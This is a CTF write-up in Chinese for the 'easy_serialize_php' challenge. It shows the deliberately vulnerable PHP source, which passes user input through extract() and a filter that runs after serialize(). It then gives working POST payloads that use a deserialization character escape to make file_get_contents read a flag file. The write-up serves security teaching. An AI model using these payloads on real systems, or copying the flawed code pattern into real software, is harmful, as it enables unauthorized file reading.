## 源码：https://github.com/D0g3-Lab/i-SOON_CTF_2019/tree/master/Web/easy_serialize_php

## 类型：php反序列化-字符逃逸

## 解题步骤：

**1：index页面上有名为source code的链接，点击后源码展示如下：**

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

**2：根据提示查看phpinfo()，GET传递参数f=phpinfo，查找到疑似flag的文件d0g3_f1ag.php,想办法读取**

![image-20250727101138489](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250727101138489.png)

**3：审计源码，关键代码注释如下：**

```php
if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
#目标：利用file_get_contents读取d0g3_f1ag.php，因此$function == 'show_image'，base64_decode($userinfo['img']) == 'd0g3_f1ag.php'
```

```php
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));
#序列化后经过 filter过滤，字符增加或减少，会引起字符逃逸，过滤器如下
```

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
#经过过滤后字符减少
```

```php
$_SESSION['function'] = $function;
extract($_POST);
#extract()的作用是将键值对变成对应的变量与它的值
#如果赋值了_SESSION[dd]="123",上面已经赋值过的SESSION[]就会消失
```

正常序列化结果：

```php
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:xx:"xxxxxxxxxxxxxxxxx";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}#guest_img.png
```

通过extract()可以控制user和funtion，user吃掉原来fucntion，function给新img

```php
_SESSION[user]=flagflagflagflagflagphp&_SESSION[function]=";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}
```

还有一种过滤键名

```php
_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

过滤前：

```php
a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img".......;}
```

过滤后：

```php
a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";.....;}
```







